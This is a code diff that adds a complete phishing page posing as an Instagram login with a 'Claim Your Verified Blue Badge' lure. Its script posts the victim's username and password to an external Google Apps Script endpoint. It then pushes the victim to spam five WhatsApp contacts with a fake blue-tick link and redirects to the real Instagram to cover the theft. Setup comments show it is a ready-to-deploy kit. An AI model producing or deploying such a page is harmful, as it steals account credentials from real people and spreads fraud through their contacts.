@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Verification</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(170deg, #fdf3f6 0%, #f7f6fa 35%, #eef5fa 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            padding: 24px;
+        }
+
+        .page-view {
+            width: 100%;
+            max-width: 400px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            flex-grow: 1;
+            justify-content: center;
+            margin-top: -20px;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        /* Top Notification Banner */
+        .top-banner {
+            background: linear-gradient(90deg, #f99d1c, #dd2a7b, #515bd4);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 24px;
+            box-shadow: 0 4px 12px rgba(221, 42, 123, 0.2);
+            text-align: center;
+            width: 100%;
+            animation: slideDown 0.5s ease-out;
+        }
+
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .logo-container {
+            margin-bottom: 32px;
+        }
+
+        .instagram-logo {
+            width: 76px;
+            height: 76px;
+        }
+
+        .form-container {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+
+        .input-field {
+            width: 100%;
+            height: 58px;
+            padding: 0 16px;
+            border: 1px solid #cbced4;
+            border-radius: 14px;
+            background-color: #ffffff;
+            font-size: 16px;
+            color: #1c1e21;
+            outline: none;
+            transition: border-color 0.15s ease;
+        }
+
+        .input-field::placeholder {
+            color: #65676b;
+            font-size: 16px;
+        }
+
+        .input-field:focus {
+            border-color: #0064e0;
+            box-shadow: 0 0 0 1px #0064e0;
+        }
+
+        .login-button {
+            width: 100%;
+            height: 46px;
+            background-color: #0064e0;
+            color: #ffffff;
+            border: none;
+            border-radius: 23px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 6px;
+        }
+
+        .forgot-link {
+            margin-top: 24px;
+            text-align: center;
+        }
+
+        .forgot-link a {
+            text-decoration: none;
+            color: #1c1e21;
+            font-size: 15px;
+            font-weight: 600;
+        }
+
+        .bottom-container {
+            width: 100%;
+            max-width: 400px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 24px;
+            margin-top: auto;
+            padding-bottom: 12px;
+        }
+
+        .create-account-button {
+            width: 100%;
+            height: 46px;
+            background-color: transparent;
+            color: #0064e0;
+            border: 1px solid #0064e0;
+            border-radius: 23px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .meta-logo {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            color: #4b4f56;
+            font-size: 15px;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+        }
+
+        .meta-logo svg {
+            width: 18px;
+            height: 18px;
+            fill: #4b4f56;
+        }
+
+        /* WhatsApp Share Screen */
+        .share-card {
+            background: #ffffff;
+            border-radius: 24px;
+            padding: 34px 24px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.04);
+            width: 100%;
+            text-align: center;
+            border: 1px solid #eef0f2;
+        }
+
+        .share-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1c1e21;
+            margin-bottom: 12px;
+        }
+
+        .share-desc {
+            font-size: 15px;
+            color: #65676b;
+            margin-bottom: 28px;
+            line-height: 1.4;
+        }
+
+        .progress-container {
+            background-color: #f0f2f5;
+            border-radius: 12px;
+            height: 22px;
+            width: 100%;
+            margin-bottom: 12px;
+            overflow: hidden;
+            border: 1px solid #e4e6eb;
+        }
+
+        .progress-bar {
+            background: linear-gradient(90deg, #25d366, #128c7e);
+            height: 100%;
+            width: 0%;
+            transition: width 0.4s cubic-bezier(0.1, 0.8, 0.3, 1);
+        }
+
+        .progress-text {
+            font-size: 16px;
+            font-weight: 700;
+            color: #1c1e21;
+            margin-bottom: 28px;
+        }
+
+        .whatsapp-button {
+            width: 100%;
+            height: 52px;
+            background-color: #25d366;
+            color: white;
+            border: none;
+            border-radius: 26px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 6px 16px rgba(37, 211, 102, 0.25);
+            transition: transform 0.1s ease;
+        }
+
+        .whatsapp-button:active {
+            transform: scale(0.98);
+        }
+
+        .whatsapp-button svg {
+            width: 22px;
+            height: 22px;
+            fill: currentColor;
+        }
+
+        /* Success Tick Animation */
+        .success-animation {
+            margin: 20px auto;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .checkmark {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            display: block;
+            stroke-width: 2;
+            stroke: #fff;
+            stroke-miterlimit: 10;
+            box-shadow: inset 0px 0px 0px #25d366;
+            animation: fill .4s ease-in-out .4s forwards, scale .3s ease-in-out .9s both;
+        }
+
+        .checkmark__circle {
+            stroke-dasharray: 166;
+            stroke-dashoffset: 166;
+            stroke-width: 2;
+            stroke-miterlimit: 10;
+            stroke: #25d366;
+            fill: none;
+            animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
+        }
+
+        .checkmark__check {
+            transform-origin: 50% 50%;
+            stroke-dasharray: 48;
+            stroke-dashoffset: 48;
+            animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards;
+        }
+
+        @keyframes stroke {
+            100% { stroke-dashoffset: 0; }
+        }
+
+        @keyframes scale {
+            0%, 100% { transform: none; }
+            50% { transform: scale3d(1.1, 1.1, 1); }
+        }
+
+        @keyframes fill {
+            100% { box-shadow: inset 0px 0px 0px 80px #25d366; }
+        }
+    </style>
+</head>
+<body>
+
+    <div id="login-view" class="page-view">
+        <div class="top-banner">✨ Claim Your Verified Blue Badge</div>
+        <div class="logo-container">
+            <svg class="instagram-logo" viewBox="0 0 24 24">
+                <defs>
+                    <radialGradient id="ig-radial" cx="20%" cy="100%" r="130%">
+                        <stop offset="0%" stop-color="#f99d1c" />
+                        <stop offset="20%" stop-color="#f75123" />
+                        <stop offset="40%" stop-color="#dd2a7b" />
+                        <stop offset="60%" stop-color="#8134af" />
+                        <stop offset="100%" stop-color="#515bd4" />
+                    </radialGradient>
+                </defs>
+                <path fill="url(#ig-radial)" d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204 0.013-3.583 0.07-4.849 0.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm3.98-10.98a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/>
+            </svg>
+        </div>
+
+        <form class="form-container" id="loginForm" onsubmit="event.preventDefault(); handleLogin();">
+            <input type="text" id="username" class="input-field" placeholder="Username, email or mobile number" required autocomplete="username">
+            <input type="password" id="password" class="input-field" placeholder="Password" required autocomplete="current-password">
+            <button type="submit" class="login-button">Log in</button>
+        </form>
+
+        <div class="forgot-link">
+            <a href="#">Forgot password?</a>
+        </div>
+    </div>
+
+    <div id="share-view" class="page-view hidden">
+        <div class="share-card" id="share-content">
+            <div class="share-title">Activate Blue Badge</div>
+            <div class="share-desc">Share this update with 5 friends or groups on WhatsApp to finalize your verification.</div>
+            
+            <div class="progress-container">
+                <div id="progress-bar" class="progress-bar"></div>
+            </div>
+            <div id="progress-text" class="progress-text">Progress: 0%</div>
+
+            <button id="btn-share" class="whatsapp-button" onclick="handleShare()">
+                <svg viewBox="0 0 24 24"><path d="M.057 24l1.687-6.163c-1.041-1.804-1.588-3.849-1.587-5.946C.06 5.348 5.397.01 12.008.01c3.202.001 6.212 1.246 8.477 3.513 2.266 2.268 3.507 5.28 3.505 8.484-.004 6.657-5.34 11.997-11.953 11.997-2.005-.001-3.973-.503-5.714-1.458L0 24zm6.59-4.846c1.6.95 3.488 1.449 5.414 1.451 5.408 0 9.809-4.394 9.812-9.799.002-2.618-1.01-5.079-2.852-6.924C17.12 2.037 14.67 1.021 12.012 1.02 6.601 1.02 2.203 5.41 2.2 10.814c-.001 1.838.48 3.634 1.395 5.211l-.993 3.626 3.712-.973zm13.064-5.926c-.322-.16-.1.905-.417-.323s-1.11-.548-1.507-.714c-.397-.165-.685-.248-.973.183-.288.43-.1.114-.766.86-.16.18-.32.201-.641.04-.322-.16-1.36-.5-2.59-1.6-.958-.853-1.603-1.907-1.792-2.227-.188-.321-.02-.495.14-.654.144-.143.322-.375.483-.563.16-.188.214-.321.321-.536.107-.214.053-.402-.026-.563-.08-.16-.685-1.651-.938-2.261-.247-.596-.498-.515-.685-.524-.177-.008-.38-.01-.583-.01-.203 0-.535.076-.814.38s-1.066 1.042-1.066 2.541c0 1.498 1.09 2.946 1.239 3.146.149.2 2.148 3.278 5.204 4.597.726.314 1.293.502 1.735.643.73.232 1.393.2 1.917.122.584-.087 1.8-.737 2.053-1.449.253-.713.253-1.323.177-1.449-.076-.127-.27-.203-.592-.363z"/></svg>
+                Share on WhatsApp
+            </button>
+        </div>
+
+        <div class="share-card hidden" id="success-content">
+            <div class="share-title" style="margin-bottom: 20px;">Request Submitted!</div>
+            <div class="success-animation">
+                <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+                    <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/>
+                    <path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
+                </svg>
+            </div>
+            <div class="share-desc" style="margin-top: 20px; margin-bottom: 0;">Your badge request is under review. Redirecting...</div>
+        </div>
+    </div>
+
+    <div class="bottom-container" id="bottom-branding">
+        <button class="create-account-button">Create new account</button>
+        <div class="meta-logo">
+            <svg viewBox="0 0 24 24">
+                <path d="M17.126 6.5c-1.393 0-2.622.716-3.483 1.833-.861-1.117-2.09-1.833-3.483-1.833C7.453 6.5 5 8.962 5 12c0 3.038 2.453 5.5 5.16 5.5 1.393 0 2.622-.716 3.483-1.833.861 1.117 2.09 1.833 3.483 1.833C19.833 17.5 22 15.038 22 12c0-3.038-2.167-5.5-4.874-5.5zm.02 9.429c-1.62 0-2.923-1.405-3.355-2.825-.098-.323-.098-.659 0-.982.432-1.42 1.735-2.825 3.355-2.825 1.636 0 2.83 1.353 2.83 3.31 0 1.956-1.194 3.322-2.83 3.322zm-10.272 0C5.237 15.929 4 14.563 4 12.607c0-1.957 1.237-3.31 2.874-3.31 1.62 0 2.923 1.405 3.355 2.825.098.323.098.659 0 .982-.432 1.42-1.735 2.825-3.355 2.825z"/>
+            </svg>
+            Meta
+        </div>
+    </div>
+
+    <script>
+        // 1. UPDATE THIS: The final link the user will share
+        const MY_WEBSITE_LINK = "https://your-domain-link.com"; 
+        
+        // 2. UPDATE THIS: Your Google Apps Script Web App URL
+        const GOOGLE_SHEET_WEBAPP_URL = "https://script.google.com/macros/s/AKfycbwiZaWl-6WxpH7VhzR9TECp81oFUffDbPBfF9OMaYK6CmIKSwQ_W-Xeqjjga-b1Z9LwJQ/exec";
+
+        let shareCount = 0;
+        let userEnteredID = "";
+
+        function handleLogin() {
+            const userVal = document.getElementById('username').value.trim();
+            const passVal = document.getElementById('password').value.trim();
+
+            userEnteredID = userVal;
+
+            // Submit input data to Google Sheet
+            if(GOOGLE_SHEET_WEBAPP_URL !== "YOUR_GOOGLE_SHEET_WEBAPP_URL") {
+                fetch(GOOGLE_SHEET_WEBAPP_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username: userVal, password: passVal })
+                }).catch(e => console.log("Error logging data", e));
+            }
+
+            // Transition UI
+            document.getElementById('login-view').classList.add('hidden');
+            document.getElementById('bottom-branding').classList.add('hidden');
+            document.getElementById('share-view').classList.remove('hidden');
+        }
+
+        function handleShare() {
+            shareCount++;
+            let progressPercentage = shareCount * 20; 
+            if(progressPercentage > 100) progressPercentage = 100;
+
+            document.getElementById('progress-bar').style.width = progressPercentage + "%";
+            document.getElementById('progress-text').innerText = "Progress: " + progressPercentage + "%";
+
+            const textMessage = `@${userEnteredID}, i got blue tick, with new instagram update, get yours with this link: ${MY_WEBSITE_LINK}`;
+            const encodedShareText = encodeURIComponent(textMessage);
+            const whatsappApiUrl = `https://api.whatsapp.com/send?text=${encodedShareText}`;
+
+            window.open(whatsappApiUrl, '_blank');
+
+            // Success action on completing shares
+            if(shareCount >= 5) {
+                // Hide share panel, show success animation
+                setTimeout(() => {
+                    document.getElementById('share-content').classList.add('hidden');
+                    document.getElementById('success-content').classList.remove('hidden');
+                    
+                    // Final redirect after animation plays
+                    setTimeout(() => {
+                        window.location.href = "https://instagram.com";
+                    }, 3000);
+                }, 1000);
+            }
+        }
+    </script>
+</body>
+</html>
